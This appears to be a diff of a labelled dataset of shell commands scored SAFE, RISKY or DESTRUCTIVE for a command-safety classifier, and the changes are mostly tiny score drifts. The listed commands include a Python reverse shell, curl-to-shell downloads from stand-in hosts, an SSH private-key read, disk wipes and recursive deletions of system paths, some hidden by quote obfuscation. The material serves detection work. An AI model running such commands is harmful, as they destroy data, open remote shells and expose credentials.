@@ -11,7 +11,7 @@
     {
       "command": "( dd if=/dev/urandom of=/tmp/testfile bs=1M count=10 )",
       "label": "SAFE",
-      "score": 0.016302900580629925
+      "score": 0.016302900580629894
     },
     {
       "command": "( git clone git@github.com:user/repo.git )",
@@ -26,32 +26,32 @@
     {
       "command": "( gradle --stop )",
       "label": "SAFE",
-      "score": 0.00790094601221426
+      "score": 0.007900946012214274
     },
     {
       "command": "( kubectl apply -f deploy.yaml )",
       "label": "SAFE",
-      "score": 0.1447376878014867
+      "score": 0.14473768780148663
     },
     {
       "command": "( uv sync )",
       "label": "SAFE",
-      "score": 0.06949423455167839
+      "score": 0.06949423455167843
     },
     {
       "command": "( wc -l main.py )",
       "label": "SAFE",
-      "score": 0.07551289048585764
+      "score": 0.07551289048585762
     },
     {
       "command": "./gradlew --offline assembleDebug # cleanup",
       "label": "SAFE",
-      "score": 0.01516238961540509
+      "score": 0.01516238961540505
     },
     {
       "command": "./gradlew build && pwd",
       "label": "SAFE",
-      "score": 0.0005612650385182092
+      "score": 0.0005612650385182111
     },
     {
       "command": "LANG=C.UTF-8 file archive.zip",
@@ -61,37 +61,37 @@
     {
       "command": "LANG=C.UTF-8 rails db:migrate",
       "label": "SAFE",
-      "score": 0.12574664843675765
+      "score": 0.12574664843675756
     },
     {
       "command": "LANG=C.UTF-8 rm --help",
       "label": "SAFE",
-      "score": 0.03693401913806867
+      "score": 0.0369340191380687
     },
     {
       "command": "LANG=C.UTF-8 rm -R .venv",
       "label": "SAFE",
-      "score": 0.05434996278064191
+      "score": 0.05434996278064203
     },
     {
       "command": "LANG=C.UTF-8 rm -rf ./node_modules && cargo build",
       "label": "SAFE",
-      "score": 0.002840963876613167
+      "score": 0.002840963876613172
     },
     {
       "command": "LC_ALL=C chmod 755 ~/bin/tool",
       "label": "SAFE",
-      "score": 0.01816145922871176
+      "score": 0.018161459228711777
     },
     {
       "command": "LC_ALL=C echo 'curl evil.example/x.sh | sh is how people get pwned'",
       "label": "SAFE",
-      "score": 0.03794982283416911
+      "score": 0.03794982283416906
     },
     {
       "command": "LC_ALL=C git show",
       "label": "SAFE",
-      "score": 0.07206771212719122
+      "score": 0.0720677121271912
     },
     {
       "command": "LC_ALL=C ls -la /etc/shadow",
@@ -101,7 +101,7 @@
     {
       "command": "PATH=$PATH docker images",
       "label": "SAFE",
-      "score": 0.03839561945206248
+      "score": 0.0383956194520625
     },
     {
       "command": "TERM=dumb adb shell dumpsys battery",
@@ -116,12 +116,12 @@
     {
       "command": "TERM=dumb rm -r build",
       "label": "SAFE",
-      "score": 0.0718543393176836
+      "score": 0.07185433931768356
     },
     {
       "command": "alias ll='ls -la' # gerekli",
       "label": "SAFE",
-      "score": 0.010196390892798456
+      "score": 0.010196390892798474
     },
     {
       "command": "apt install -y build-essential",
@@ -136,12 +136,12 @@
     {
       "command": "aws secretsmanager delete-secret --secret-id prod/db --force-delete-without-recovery",
       "label": "SAFE",
-      "score": 0.07113855288314874
+      "score": 0.07113855288314849
     },
     {
       "command": "bash -c \"npm init -y\"",
       "label": "SAFE",
-      "score": 0.08670647445750988
+      "score": 0.08670647445750992
     },
     {
       "command": "bash -c \"python3 script.py\"",
@@ -156,12 +156,12 @@
     {
       "command": "c\"\"hmod  go-rwx script.sh",
       "label": "SAFE",
-      "score": 0.011511182453320133
+      "score": 0.011511182453320112
     },
     {
       "command": "c\"\"url  -X PUT https://api.example.com/config -d @cfg.json",
       "label": "SAFE",
-      "score": 0.07985091204718414
+      "score": 0.07985091204718407
     },
     {
       "command": "c''at  cleanup.sh",
@@ -176,12 +176,12 @@
     {
       "command": "cargo tree # gerekli",
       "label": "SAFE",
-      "score": 0.036051233223999946
+      "score": 0.03605123322399991
     },
     {
       "command": "cat /etc/os-release",
       "label": "SAFE",
-      "score": 0.0684895963110746
+      "score": 0.06848959631107462
     },
     {
       "command": "cd /tmp && chown $USER:$USER ~/project",
@@ -196,12 +196,12 @@
     {
       "command": "cd ~ && stat file.txt",
       "label": "SAFE",
-      "score": 0.012535242445992951
+      "score": 0.012535242445992939
     },
     {
       "command": "cd ~ && sudo rm -rf /var/lib/apt/lists/*",
       "label": "SAFE",
-      "score": 0.15477063351762757
+      "score": 0.1547706335176277
     },
     {
       "command": "chmod --version || true",
@@ -216,7 +216,7 @@
     {
       "command": "chmod -R u+rwX ~/bin # cleanup",
       "label": "SAFE",
-      "score": 0.04842688964894205
+      "score": 0.04842688964894206
     },
     {
       "command": "chmod 600 script.sh && pwd",
@@ -231,7 +231,7 @@
     {
       "command": "d''d  if=input.bin of=blank.img bs=1M count=100",
       "label": "SAFE",
-      "score": 0.002333774631967404
+      "score": 0.002333774631967402
     },
     {
       "command": "dd if=/dev/urandom of=blank.img bs=1M count=100 >/dev/null",
@@ -241,37 +241,37 @@
     {
       "command": "dd if=image.iso of=output.img bs=1M count=1 2>/dev/null",
       "label": "SAFE",
-      "score": 0.0005124188753765917
+      "score": 0.0005124188753765934
     },
     {
       "command": "docker image rm app:latest",
       "label": "SAFE",
-      "score": 0.028338996665474722
+      "score": 0.028338996665474767
     },
     {
       "command": "docker run -it \\\n   --rm ubuntu bash",
       "label": "SAFE",
-      "score": 0.017036165054356282
+      "score": 0.017036165054356223
     },
     {
       "command": "du -sh ~/storage/shared/* # duzelt",
       "label": "SAFE",
-      "score": 0.09365422024945212
+      "score": 0.0936542202494521
     },
     {
       "command": "find . -type d -empty -delete",
       "label": "SAFE",
-      "score": 0.08218083140785135
+      "score": 0.08218083140785137
     },
     {
       "command": "find ./src -name '*.tmp' -delete # TODO",
       "label": "SAFE",
-      "score": 0.08034888077861571
+      "score": 0.08034888077861561
     },
     {
       "command": "find ./target -name '*.log' -exec rm -f {} \\; 1>/dev/null",
       "label": "SAFE",
-      "score": 0.025417515105744894
+      "score": 0.025417515105744918
     },
     {
       "command": "g''it  branch",
@@ -281,27 +281,27 @@
     {
       "command": "g''it  commit -m 'fix: fork bomb in bootstrap script'",
       "label": "SAFE",
-      "score": 0.004689738581440156
+      "score": 0.004689738581440164
     },
     {
       "command": "git commit -m 'wip' ; true",
       "label": "SAFE",
-      "score": 0.03324921483404399
+      "score": 0.03324921483404396
     },
     {
       "command": "git gc # cleanup",
       "label": "SAFE",
-      "score": 0.08956202706398982
+      "score": 0.08956202706398986
     },
     {
       "command": "git log -p -- src/app.py",
       "label": "SAFE",
-      "score": 0.010499725266548937
+      "score": 0.01049972526654892
     },
     {
       "command": "git pull --rebase origin main # sonra bak",
       "label": "SAFE",
-      "score": 0.0667612550724509
+      "score": 0.06676125507245086
     },
     {
       "command": "git push origin +feature/x",
@@ -311,17 +311,17 @@
     {
       "command": "git restore ./src",
       "label": "SAFE",
-      "score": 0.2688327259723781
+      "score": 0.26883272597237823
     },
     {
       "command": "info coreutils 'rm invocation' >/dev/null",
       "label": "SAFE",
-      "score": 0.02959211356517103
+      "score": 0.029592113565171056
     },
     {
       "command": "journalctl --since '1 hour ago' | grep -i \\\n   sudo",
       "label": "SAFE",
-      "score": 0.01127995835985407
+      "score": 0.011279958359854061
     },
     {
       "command": "journalctl --since '1 hour ago' | grep -i sudo # cleanup",
@@ -331,37 +331,37 @@
     {
       "command": "jupyter notebook 2>/dev/null",
       "label": "SAFE",
-      "score": 0.052197556301371975
+      "score": 0.052197556301372024
     },
     {
       "command": "k\"\"ubectl  delete -f k8s/ --dry-run=client",
       "label": "SAFE",
-      "score": 0.09300805139269411
+      "score": 0.09300805139269415
     },
     {
       "command": "l\"\"ess  /var/log/syslog",
       "label": "SAFE",
-      "score": 0.009932389494166893
+      "score": 0.00993238949416691
     },
     {
       "command": "ls -d \\\n   */",
       "label": "SAFE",
-      "score": 0.07861836363728322
+      "score": 0.07861836363728318
     },
     {
       "command": "ls >/dev/null 2>&1",
       "label": "SAFE",
-      "score": 0.04681372157956022
+      "score": 0.04681372157956025
     },
     {
       "command": "mv -n a.txt b.txt # gerekli",
       "label": "SAFE",
-      "score": 0.036465714438022136
+      "score": 0.03646571443802211
     },
     {
       "command": "mv old_name.py new_name.py && echo ok",
       "label": "SAFE",
-      "score": 0.06765850690356323
+      "score": 0.0676585069035632
     },
     {
       "command": "mysql -u root -p",
@@ -371,12 +371,12 @@
     {
       "command": "npm install -D typescript",
       "label": "SAFE",
-      "score": 0.07846146887902346
+      "score": 0.0784614688790235
     },
     {
       "command": "pkill --force \"next dev\"",
       "label": "SAFE",
-      "score": 0.046692668352647605
+      "score": 0.046692668352647584
     },
     {
       "command": "pnpm dev # sonra bak",
@@ -391,7 +391,7 @@
     {
       "command": "psql -c \"UPDATE users SET active = false WHERE last_login < now() - interval '1 year';\" # gerekli",
       "label": "SAFE",
-      "score": 0.05426038212234587
+      "score": 0.05426038212234597
     },
     {
       "command": "r\"\"ails  db:seed",
@@ -401,7 +401,7 @@
     {
       "command": "rg 'mkfs' -l",
       "label": "SAFE",
-      "score": 0.04473730766456277
+      "score": 0.04473730766456273
     },
     {
       "command": "rm --recursive *.o",
@@ -411,12 +411,12 @@
     {
       "command": "rm --recursive --force .nuxt",
       "label": "SAFE",
-      "score": 0.1364366021474078
+      "score": 0.13643660214740785
     },
     {
       "command": "rm --recursive --force dist && pip install --recursive requirements.txt",
       "label": "SAFE",
-      "score": 0.03734838807279657
+      "score": 0.037348388072796605
     },
     {
       "command": "rm --recursive coverage",
@@ -426,7 +426,7 @@
     {
       "command": "rm -rf $PWD/build # cleanup",
       "label": "SAFE",
-      "score": 0.1047177495198261
+      "score": 0.10471774951982606
     },
     {
       "command": "rm -rf build && yarn install ; true",
@@ -436,7 +436,7 @@
     {
       "command": "rm -rf coverage",
       "label": "SAFE",
-      "score": 0.0637154779887653
+      "score": 0.06371547798876533
     },
     {
       "command": "rm -rf node_modules && pnpm install # TODO",
@@ -446,7 +446,7 @@
     {
       "command": "s''udo  apt autoclean",
       "label": "SAFE",
-      "score": 0.07700156649274353
+      "score": 0.07700156649274348
     },
     {
       "command": "s''udo  useradd -m deploy",
@@ -456,7 +456,7 @@
     {
       "command": "sh -c './gradlew assembleRelease'",
       "label": "SAFE",
-      "score": 0.006619020385571748
+      "score": 0.006619020385571737
     },
     {
       "command": "sh -c 'docker container prune'",
@@ -466,7 +466,7 @@
     {
       "command": "sudo chmod 755 /usr/local/bin/mytool ; date",
       "label": "SAFE",
-      "score": 0.05644839487700859
+      "score": 0.05644839487700857
     },
     {
       "command": "sudo nginx -s reload # gerekli",
@@ -481,17 +481,17 @@
     {
       "command": "terraform import aws_s3_bucket.b my-bucket 2>/dev/null",
       "label": "SAFE",
-      "score": 0.07021445171218867
+      "score": 0.07021445171218861
     },
     {
       "command": "truncate -s 0 logs/app.log ; true",
       "label": "SAFE",
-      "score": 0.040883303524474286
+      "score": 0.040883303524474196
     },
     {
       "command": "wc -w *.md",
       "label": "SAFE",
-      "score": 0.14503130436206746
+      "score": 0.14503130436206751
     },
     {
       "command": "wc -w *.md # sonra bak",
@@ -501,62 +501,62 @@
     {
       "command": "yarn install 2>/dev/null",
       "label": "SAFE",
-      "score": 0.025557487943773032
+      "score": 0.025557487943773008
     },
     {
       "command": "( dnf remove -y torch )",
       "label": "RISKY",
-      "score": 0.9774527656670136
+      "score": 0.9774527656670144
     },
     {
       "command": "( docker container prune -f )",
       "label": "RISKY",
-      "score": 0.404549744687858
+      "score": 0.40454974468785804
     },
     {
       "command": "( gem uninstall -a -x nodejs )",
       "label": "RISKY",
-      "score": 0.9717451210861057
+      "score": 0.9717451210861053
     },
     {
       "command": "( git reset --hard HEAD )",
       "label": "RISKY",
-      "score": 1.1930423119838298
+      "score": 1.1930423119838305
     },
     {
       "command": "( git stash drop )",
       "label": "RISKY",
-      "score": 1.0021079308210907
+      "score": 1.00210793082109
     },
     {
       "command": "( sudo mdadm --stop /dev/md0 )",
       "label": "RISKY",
-      "score": 1.0452610491210155
+      "score": 1.0452610491210153
     },
     {
       "command": "( termux-change-repo )",
       "label": "RISKY",
-      "score": 0.9482403999088812
+      "score": 0.948240399908881
     },
     {
       "command": "( terraform state rm aws_db_instance.main )",
       "label": "RISKY",
-      "score": 0.9456358163167546
+      "score": 0.9456358163167539
     },
     {
       "command": "DROP TABLE IF EXISTS tmp_import; ; true",
       "label": "RISKY",
-      "score": 0.946159222480648
+      "score": 0.9461592224806477
     },
     {
       "command": "LANG=C.UTF-8 composer remove --no-update git",
       "label": "RISKY",
-      "score": 0.9717482964823664
+      "score": 0.9717482964823659
     },
     {
       "command": "LANG=C.UTF-8 git push origin --delete old-branch",
       "label": "RISKY",
-      "score": 0.9791114981780883
+      "score": 0.9791114981780881
     },
     {
       "command": "LANG=C.UTF-8 git restore src/main.py",
@@ -571,22 +571,22 @@
     {
       "command": "LC_ALL=C mv important.db /tmp/",
       "label": "RISKY",
-      "score": 1.0087130792815433
+      "score": 1.0087130792815426
     },
     {
       "command": "LC_ALL=C rm -rf data/",
       "label": "RISKY",
-      "score": 1.1060382120659977
+      "score": 1.1060382120659984
     },
     {
       "command": "LC_ALL=C su -c \"pm uninstall -k --user 0 com.google.android.gms\"",
       "label": "RISKY",
-      "score": 0.9423938757269127
+      "score": 0.9423938757269122
     },
     {
       "command": "LC_ALL=C terraform state rm aws_db_instance.main",
       "label": "RISKY",
-      "score": 0.9662634784627838
+      "score": 0.9662634784627835
     },
     {
       "command": "PATH=$PATH apt-get autoremove --purge -y docker.io",
@@ -601,12 +601,12 @@
     {
       "command": "PATH=$PATH rm ~/storage/shared/Download/*.apk",
       "label": "RISKY",
-      "score": 0.9778401756695649
+      "score": 0.9778401756695658
     },
     {
       "command": "PATH=$PATH su -c \"mount -o remount,rw /system\"",
       "label": "RISKY",
-      "score": 1.0276417174092631
+      "score": 1.0276417174092627
     },
     {
       "command": "PATH=$PATH sudo chmod -R 755 /etc",
@@ -616,32 +616,32 @@
     {
       "command": "TERM=dumb pip uninstall -y git",
       "label": "RISKY",
-      "score": 1.035577481640407
+      "score": 1.0355774816404064
     },
     {
       "command": "adb reboot bootloader # TODO",
       "label": "RISKY",
-      "score": 0.9890013803592248
+      "score": 0.9890013803592241
     },
     {
       "command": "adb reboot bootloader ; date",
       "label": "RISKY",
-      "score": 0.992621907196444
+      "score": 0.9926219071964438
     },
     {
       "command": "apt purge -y git # sonra bak",
       "label": "RISKY",
-      "score": 1.0335413343765647
+      "score": 1.033541334376565
     },
     {
       "command": "apt-get autoremove --purge -y \\\n   nodejs",
       "label": "RISKY",
-      "score": 0.9894897921676226
+      "score": 0.989489792167623
     },
     {
       "command": "apt-get autoremove --purge -y python3 # duzelt",
       "label": "RISKY",
-      "score": 1.00532460333068
+      "score": 1.0053246033306802
     },
     {
       "command": "aws iam delete-access-key --access-key-id AKIAXXXX # cleanup",
@@ -651,7 +651,7 @@
     {
       "command": "bash -c \"apt-get remove --purge -y git\"",
       "label": "RISKY",
-      "score": 0.9844860700894154
+      "score": 0.9844860700894158
     },
     {
       "command": "bash -c \"docker volume prune -a\"",
@@ -661,22 +661,22 @@
     {
       "command": "bash -c \"kubectl delete deployment api\"",
       "label": "RISKY",
-      "score": 1.065780422923025
+      "score": 1.0657804229230248
     },
     {
       "command": "bash -c \"sed -i '' 's/foo/bar/g' src/*.js\"",
       "label": "RISKY",
-      "score": 0.9740049434302915
+      "score": 0.974004943430292
     },
     {
       "command": "c''argo  remove libc6",
       "label": "RISKY",
-      "score": 0.9987357824200299
+      "score": 0.9987357824200297
     },
     {
       "command": "c''at  ~/.ssh/id_rsa",
       "label": "RISKY",
-      "score": 0.9779790546567657
+      "score": 0.9779790546567653
     },
     {
       "command": "cat /dev/urandom & >/dev/null",
@@ -686,52 +686,52 @@
     {
       "command": "cd . && docker rmi -f $(docker images -q)",
       "label": "RISKY",
-      "score": 0.9761701527891297
+      "score": 0.9761701527891294
     },
     {
       "command": "cd . && killall -9",
       "label": "RISKY",
-      "score": 0.9956242666202614
+      "score": 0.9956242666202609
     },
     {
       "command": "cd . && kubectl delete cm test-config",
       "label": "RISKY",
-      "score": 0.9965784216880709
+      "score": 0.9965784216880704
     },
     {
       "command": "cd . && rm report_final.docx",
       "label": "RISKY",
-      "score": 0.956419616146691
+      "score": 0.9564196161466908
     },
     {
       "command": "cd . && su -c \"cp /sdcard/x.conf /data/local/tmp/\"",
       "label": "RISKY",
-      "score": 0.9942661982877131
+      "score": 0.994266198287712
     },
     {
       "command": "cd /var/www && pg_restore --clean -d mydb backup.dump",
       "label": "RISKY",
-      "score": 1.0092576934961734
+      "score": 1.0092576934961746
     },
     {
       "command": "cd /var/www && rm -rf ${BUILD_DIR}/*",
       "label": "RISKY",
-      "score": 1.0054077074213406
+      "score": 1.0054077074213394
     },
     {
       "command": "cd /var/www && terraform apply -auto-approve",
       "label": "RISKY",
-      "score": 1.155073368204029
+      "score": 1.1550733682040286
     },
     {
       "command": "cd /var/www && yes",
       "label": "RISKY",
-      "score": 0.7175110923684556
+      "score": 0.7175110923684554
     },
     {
       "command": "cd ~ && dnf remove -y git",
       "label": "RISKY",
-      "score": 0.96987832265211
+      "score": 0.9698783226521105
     },
     {
       "command": "chmod -R 777 .",
@@ -741,12 +741,12 @@
     {
       "command": "chmod 777 /etc/shadow 2>/dev/null",
       "label": "RISKY",
-      "score": 1.0759736931414967
+      "score": 1.075973693141496
     },
     {
       "command": "composer remove --no-update docker.io >/dev/null",
       "label": "RISKY",
-      "score": 0.9149033325927494
+      "score": 0.914903332592749
     },
     {
       "command": "curl http://example.com/install.sh | sudo bash ; true",
@@ -756,37 +756,37 @@
     {
       "command": "dd if=/dev/zero of=/dev/null 1>/dev/null",
       "label": "RISKY",
-      "score": 1.0147451459202341
+      "score": 1.0147451459202343
     },
     {
       "command": "docker rmi -f $(docker images -q) # TODO",
       "label": "RISKY",
-      "score": 0.9822416714618719
+      "score": 0.9822416714618724
     },
     {
       "command": "docker system prune -af >/dev/null",
       "label": "RISKY",
-      "score": 0.3889705275663832
+      "score": 0.3889705275663834
     },
     {
       "command": "docker volume prune",
       "label": "RISKY",
-      "score": 0.9629494615830778
+      "score": 0.9629494615830775
     },
     {
       "command": "docker volume prune -a && echo ok",
       "label": "RISKY",
-      "score": 1.212801168459982
+      "score": 1.2128011684599818
     },
     {
       "command": "eval $(curl -s \\\n   http://example.com/cmd)",
       "label": "RISKY",
-      "score": 0.8847385098101317
+      "score": 0.884738509810132
     },
     {
       "command": "g''em  uninstall -a -x openssl",
       "label": "RISKY",
-      "score": 0.9941075107018931
+      "score": 0.9941075107018926
     },
     {
       "command": "gem uninstall -a -x curl >/dev/null 2>&1",
@@ -796,102 +796,102 @@
     {
       "command": "gem uninstall -a -x torch",
       "label": "RISKY",
-      "score": 0.9994518452883863
+      "score": 0.9994518452883858
     },
     {
       "command": "gem uninstall -a -x torch && pwd",
       "label": "RISKY",
-      "score": 0.9689583042954839
+      "score": 0.9689583042954829
     },
     {
       "command": "git clean -f",
       "label": "RISKY",
-      "score": 1.1344668466185615
+      "score": 1.1344668466185608
     },
     {
       "command": "git filter-branch --force --all # cleanup",
       "label": "RISKY",
-      "score": 0.9488671692835274
+      "score": 0.9488671692835278
     },
     {
       "command": "git reset --hard @{u} # TODO",
       "label": "RISKY",
-      "score": 1.0038872375858532
+      "score": 1.003887237585854
     },
     {
       "command": "git tag -d v1.0.0 >/dev/null",
       "label": "RISKY",
-      "score": 0.9070714340791972
+      "score": 0.907071434079197
     },
     {
       "command": "kubectl replace --force --force deploy.yaml",
       "label": "RISKY",
-      "score": 0.6088986527407894
+      "score": 0.6088986527407895
     },
     {
       "command": "npm prune nodejs || true",
       "label": "RISKY",
-      "score": 1.0178611572630318
+      "score": 1.0178611572630325
     },
     {
       "command": "npm prune python3 && echo ok",
       "label": "RISKY",
-      "score": 1.0031205899571478
+      "score": 1.0031205899571476
     },
     {
       "command": "npm prune torch 2>/dev/null",
       "label": "RISKY",
-      "score": 0.973075756625676
+      "score": 0.9730757566256762
     },
     {
       "command": "npm uninstall -g \\\n   docker.io",
       "label": "RISKY",
-      "score": 0.9750307141222609
+      "score": 0.9750307141222606
     },
     {
       "command": "pip uninstall -y curl # sonra bak",
       "label": "RISKY",
-      "score": 0.9394609178109667
+      "score": 0.939460917810967
     },
     {
       "command": "pip uninstall -y libc6 ; true",
       "label": "RISKY",
-      "score": 0.9713889136611106
+      "score": 0.9713889136611097
     },
     {
       "command": "pkill -9 node",
       "label": "RISKY",
-      "score": 1.0000176541481012
+      "score": 1.000017654148101
     },
     {
       "command": "pm2 restart all && pwd",
       "label": "RISKY",
-      "score": 1.007971754360501
+      "score": 1.0079717543605011
     },
     {
       "command": "r\"\"sync  -a --delete src/ dst/",
       "label": "RISKY",
-      "score": 0.9647669339984349
+      "score": 0.9647669339984342
     },
     {
       "command": "rm --recursive --force ../../",
       "label": "RISKY",
-      "score": 1.0792975640023146
+      "score": 1.0792975640023152
     },
     {
       "command": "rm -rf \"$1\" 2>/dev/null",
       "label": "RISKY",
-      "score": 1.0424938378504103
+      "score": 1.0424938378504107
     },
     {
       "command": "rm -rf logs/ && echo ok",
       "label": "RISKY",
-      "score": 1.0072900321739768
+      "score": 1.0072900321739766
     },
     {
       "command": "rm report_final.docx && pwd",
       "label": "RISKY",
-      "score": 0.9937927418963561
+      "score": 0.9937927418963564
     },
     {
       "command": "s''u  -c \"cat /proc/cpuinfo\"",
@@ -906,67 +906,67 @@
     {
       "command": "s''udo  chown -R $(whoami) /usr/local/bin",
       "label": "RISKY",
-      "score": 0.9728683860464101
+      "score": 0.972868386046411
     },
     {
       "command": "s''udo  sed -i 's/^/#/' /etc/fstab",
       "label": "RISKY",
-      "score": 0.9768937713544186
+      "score": 0.9768937713544197
     },
     {
       "command": "sed --interactive '' 's/foo/bar/g' src/*.js",
       "label": "RISKY",
-      "score": 0.8834186475007423
+      "score": 0.8834186475007433
     },
     {
       "command": "sh -c 'git branch -D feature/auth'",
       "label": "RISKY",
-      "score": 0.9611020470654073
+      "score": 0.9611020470654067
     },
     {
       "command": "sh -c 'tar --remove-files -czf logs.tar.gz *.log'",
       "label": "RISKY",
-      "score": 1.0195431326159035
+      "score": 1.0195431326159043
     },
     {
       "command": "sqlmap -u \\\n   \"http://target/?id=1\" --dump",
       "label": "RISKY",
-      "score": 0.9502122071190131
+      "score": 0.9502122071190128
     },
     {
       "command": "ssh-keygen -f \\\n   ~/.ssh/id_rsa",
       "label": "RISKY",
-      "score": 1.092208246865439
+      "score": 1.0922082468654393
     },
     {
       "command": "ssh-keygen -f ~/.ssh/id_rsa",
       "label": "RISKY",
-      "score": 1.0435372448910123
+      "score": 1.0435372448910127
     },
     {
       "command": "su -c \"cat /proc/cpuinfo\"",
       "label": "RISKY",
-      "score": 0.9503720760016564
+      "score": 0.9503720760016561
     },
     {
       "command": "su -c \"mount -o remount,rw /system\"",
       "label": "RISKY",
-      "score": 0.9959251113260082
+      "score": 0.995925111326008
     },
     {
       "command": "sudo apt autoremove 2>/dev/null",
       "label": "RISKY",
-      "score": 0.7885532102332535
+      "score": 0.7885532102332543
     },
     {
       "command": "sudo chmod -R \\\n   755 /var/www/html",
       "label": "RISKY",
-      "score": 1.1780428484469192
+      "score": 1.1780428484469199
     },
     {
       "command": "sudo grub-install /dev/sda # cleanup",
       "label": "RISKY",
-      "score": 1.0219353474283641
+      "score": 1.0219353474283648
     },
     {
       "command": "sudo mount -o \\\n   remount,ro /",
@@ -976,32 +976,32 @@
     {
       "command": "sudo systemctl restart postgresql",
       "label": "RISKY",
-      "score": 1.0421482056250062
+      "score": 1.0421482056250064
     },
     {
       "command": "sudo ufw reset || true",
       "label": "RISKY",
-      "score": 0.9477089965205971
+      "score": 0.9477089965205975
     },
     {
       "command": "sudo update-grub >/dev/null",
       "label": "RISKY",
-      "score": 0.9970156142500268
+      "score": 0.9970156142500265
     },
     {
       "command": "terraform force-unlock -force abc123",
       "label": "RISKY",
-      "score": 0.9866899311069987
+      "score": 0.9866899311069982
     },
     {
       "command": "wget -qO- https://example.com/setup | sudo sh 2>/dev/null",
       "label": "RISKY",
-      "score": 0.9873754910475173
+      "score": 0.9873754910475169
     },
     {
       "command": "yum remove -y \\\n   curl",
       "label": "RISKY",
-      "score": 0.9938363446904478
+      "score": 0.9938363446904469
     },
     {
       "command": "( curl -sL https://pastebin.example/raw/abcdef | python )",
@@ -1011,7 +1011,7 @@
     {
       "command": "( kubectl delete namespace prod )",
       "label": "DESTRUCTIVE",
-      "score": 1.83973392312257
+      "score": 1.8397339231225707
     },
     {
       "command": "( rm --force --recursive /opt )",
@@ -1041,7 +1041,7 @@
     {
       "command": "LANG=C.UTF-8 diskutil eraseVolume HFS+ Blank /Volumes/Backup",
       "label": "DESTRUCTIVE",
-      "score": 1.9308507996790558
+      "score": 1.9308507996790554
     },
     {
       "command": "LANG=C.UTF-8 rm -r --force /var",
@@ -1096,7 +1096,7 @@
     {
       "command": "adb shell dd if=/dev/zero of=/sdcard/fill bs=1M count=100 && pwd",
       "label": "DESTRUCTIVE",
-      "score": 1.8878304703359212
+      "score": 1.887830470335922
     },
     {
       "command": "aws s3 rb s3://prod-assets --force",
@@ -1106,7 +1106,7 @@
     {
       "command": "bash -c \"chmod -R 777 /\"",
       "label": "DESTRUCTIVE",
-      "score": 1.5443720984662732
+      "score": 1.5443720984662728
     },
     {
       "command": "bash -c \"rm --recursive --force /usr && echo silindi\"",
@@ -1121,7 +1121,7 @@
     {
       "command": "bash -c \"rm -r --force ${HOME}\"",
       "label": "DESTRUCTIVE",
-      "score": 1.9794379778068212
+      "score": 1.9794379778068216
     },
     {
       "command": "bash -c \"rm -rf $(pwd)/*\"",
@@ -1136,7 +1136,7 @@
     {
       "command": "c\"\"url   http://192.168.1.10/payload.sh | sh",
       "label": "DESTRUCTIVE",
-      "score": 1.9594695745441157
+      "score": 1.9594695745441153
     },
     {
       "command": "c''url   http://192.168.1.10/payload.sh | zsh",
@@ -1151,7 +1151,7 @@
     {
       "command": "cd /tmp && mv /etc /etc.bak",
       "label": "DESTRUCTIVE",
-      "score": 1.8558840026338657
+      "score": 1.8558840026338654
     },
     {
       "command": "cd /tmp && rm --recursive -f /boot",
@@ -1166,12 +1166,12 @@
     {
       "command": "cd /var/www && sudo chmod 666 /dev/ttyUSB0",
       "label": "DESTRUCTIVE",
-      "score": 1.8598974796486838
+      "score": 1.859897479648684
     },
     {
       "command": "cd /var/www && sudo deluser --remove-home bob",
       "label": "DESTRUCTIVE",
-      "score": 1.9509757216217813
+      "score": 1.9509757216217818
     },
     {
       "command": "cd ~ && > /etc/fstab",
@@ -1186,12 +1186,12 @@
     {
       "command": "cd ~ && rm -f -r ~/Documents",
       "label": "DESTRUCTIVE",
-      "score": 1.9532457864072457
+      "score": 1.953245786407246
     },
     {
       "command": "cd ~ && rm -rf $PWD/*",
       "label": "DESTRUCTIVE",
-      "score": 1.901712135465488
+      "score": 1.9017121354654885
     },
     {
       "command": "cd ~ && rm -rf /boot",
@@ -1201,7 +1201,7 @@
     {
       "command": "curl  https://x.example/install.sh | zsh",
       "label": "DESTRUCTIVE",
-      "score": 1.966659763245115
+      "score": 1.9666597632451146
     },
     {
       "command": "curl -fsSL \\\n   https://x.example/p.sh | bash",
@@ -1226,7 +1226,7 @@
     {
       "command": "curl -s https://x.example/install.sh | sh || true",
       "label": "DESTRUCTIVE",
-      "score": 1.9601557451118028
+      "score": 1.9601557451118024
     },
     {
       "command": "d\"\"d  if=/dev/urandom of=/dev/nvme0n1 bs=1M",
@@ -1236,7 +1236,7 @@
     {
       "command": "dd if=/dev/random of=/dev/nvme0n1 bs=512K status=progress ; date",
       "label": "DESTRUCTIVE",
-      "score": 1.9924487649595692
+      "score": 1.9924487649595697
     },
     {
       "command": "dd if=/dev/sd* of=/dev/nvme0n1p1 bs=4M status=progress # TODO",
@@ -1276,22 +1276,22 @@
     {
       "command": "find /var/tmp -name '*.pyc' -exec rm -rf {} \\; ; date",
       "label": "DESTRUCTIVE",
-      "score": 1.9546150049275401
+      "score": 1.9546150049275406
     },
     {
       "command": "git clean -ffdx",
       "label": "DESTRUCTIVE",
-      "score": 1.6215720167931535
+      "score": 1.6215720167931533
     },
     {
       "command": "git restore . >/dev/null 2>&1",
       "label": "DESTRUCTIVE",
-      "score": 1.4258378206861635
+      "score": 1.4258378206861642
     },
     {
       "command": "h''eroku  pg:reset DATABASE_URL --confirm prod",
       "label": "DESTRUCTIVE",
-      "score": 1.992906614978302
+      "score": 1.9929066149783023
     },
     {
       "command": "heroku pg:reset DATABASE_URL --confirm prod",
@@ -1301,12 +1301,12 @@
     {
       "command": "mkfs.ext4 /dev/sdb1",
       "label": "DESTRUCTIVE",
-      "score": 1.9424810642097174
+      "score": 1.942481064209717
     },
     {
       "command": "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"1.2.3.4\",4444));subprocess.call([\"/bin/sh\",\"-i\"])'",
       "label": "DESTRUCTIVE",
-      "score": 1.9500636000273575
+      "score": 1.9500636000273572
     },
     {
       "command": "r\"\"m  -f ~/.ssh/known_hosts",
@@ -1316,7 +1316,7 @@
     {
       "command": "r''m  --recursive -f /sbin",
       "label": "DESTRUCTIVE",
-      "score": 1.9830179719953729
+      "score": 1.9830179719953724
     },
     {
       "command": "rm --force --recursive .*/* ; date",
@@ -1356,7 +1356,7 @@
     {
       "command": "rm --recursive -f \\\n   /storage/emulated/0/*",
       "label": "DESTRUCTIVE",
-      "score": 1.9906474215380758
+      "score": 1.9906474215380763
     },
     {
       "command": "rm -R -f /etc/* # gerekli",
@@ -1396,7 +1396,7 @@
     {
       "command": "rm -fr ./* || true",
       "label": "DESTRUCTIVE",
-      "score": 1.9416996492702396
+      "score": 1.94169964927024
     },
     {
       "command": "rm -fr / 2>/dev/null",
@@ -1421,7 +1421,7 @@
     {
